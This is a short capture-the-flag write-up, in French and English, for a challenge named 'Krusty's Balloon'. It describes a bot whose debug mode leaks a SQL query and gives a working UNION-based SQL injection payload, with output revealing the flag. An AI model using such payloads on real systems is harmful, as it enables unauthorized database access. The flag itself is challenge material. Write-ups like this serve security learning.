# Krusty's Balloon (Krusty Bot 5)

## Write-up (français)

La description indique que le mode debug a été activé.
En faisant une erreur via une injection sql dans la commande `/balloon_see`, on reçoit un message privé du bot contenant la requête sql.
```
DEBUG MODE : unrecognized token: "''';"
This happend during the query : SELECT emoji, points FROM balloons JOIN players ON balloons.possessed_by = players.id WHERE players.name = ''';
```

De plus, on sait que l'élément que l'on veut afficher et la description du ballon.
En demandant à chat gpt on peut facilement obtenir un payload.

Celui-ci fonctionne parfaitement : `' UNION SELECT description, 1 FROM balloons--`

La commande affiche alors 
```
  emoji  |  points | description
---------|---------|- 
A balloon|   1    
Flag-1nfl4t4bl3|   1 
```

## Write-up (english)

The description says that the debug mode has been activated,
We can throw an error through an sql injection in the command `/balloon_see`, and we receive a private message from the bot containing the sql query.

```
DEBUG MODE : unrecognized token: "''';"
This happend during the query : SELECT emoji, points FROM balloons JOIN players ON balloons.possessed_by = players.id WHERE players.name = ''';
```

Knowing that the element we want to display is the balloon's description, we can ask chat gpt for a payload.

This one works perfectly: `' UNION SELECT description, 1 FROM balloons--`

The command then displays 
```
  emoji  |  points | description
---------|---------|-
A balloon|   1
Flag-1nfl4t4bl3|   1
```